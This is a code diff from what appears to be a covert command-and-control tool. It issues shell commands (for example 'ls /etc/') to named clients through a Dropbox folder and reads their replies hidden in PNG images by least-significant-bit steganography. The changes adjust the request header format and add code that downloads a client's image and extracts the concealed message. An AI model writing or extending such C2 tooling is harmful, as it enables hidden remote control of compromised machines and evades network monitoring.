@@ -97,7 +97,7 @@ def send_heartbeat(dbx):
 
 
 def execute_command(dbx, command, client):
-    header = current_datetime() + "|REQUEST|" + command + "|" + client + "|\n"
+    header = current_datetime() + "|REQUEST|" + command + "|" + client + "|;"
     print(header)
      
     for entry in dbx.files_list_folder('/art').entries:
@@ -163,4 +163,14 @@ if __name__ == '__main__':
     #test_str = "30/12/2023 19:56:59|REQUEST|ls /etc/|ahston|"
     #print(test_str.split('|'))
     dbx = init(sys.argv[1])
-    execute_command(dbx, 'ls /etc/', 'test.png')
+    #execute_command(dbx, 'heartbeat', 'test_test.png')
+
+    client = 'test_test_test.png'
+     
+    for entry in dbx.files_list_folder('/art').entries:
+        if entry.name == client:
+            dbx.files_download_to_file("./" + entry.name, entry.path_lower)
+
+    message = lsb.reveal(client, lsb.generators.eratosthenes())
+    
+    print(message.split('\n'))
